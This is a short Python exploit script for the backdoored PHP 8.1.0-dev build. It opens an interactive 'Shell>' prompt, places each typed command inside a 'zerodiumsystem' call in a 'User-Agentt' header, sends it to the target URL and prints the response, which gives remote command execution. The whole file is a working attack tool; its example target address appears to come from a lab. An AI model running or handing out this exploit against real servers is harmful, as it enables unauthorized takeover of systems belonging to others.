import requests, sys


if len(sys.argv) != 2:
    print("* PHP 8.1.0-dev - 'User-Agentt' Remote Command Execution *\n")
    print("Usage: python3 exploit.py <rhost>")
    print("Example: python3 exploit.py http://10.129.170.77")
    sys.exit()


rhost = sys.argv[1]
while True:
    cmd = input("Shell> ")
    headers = {"User-Agentt": f"zerodiumsystem('{cmd}');"}
    try:
        req = requests.get(url=rhost, headers=headers, verify=False, timeout=30)
        print(req.text.split('<!DOCTYPE html>')[0])
    except Exception as e:
        sys.exit()(f"Exception occured: {e}")
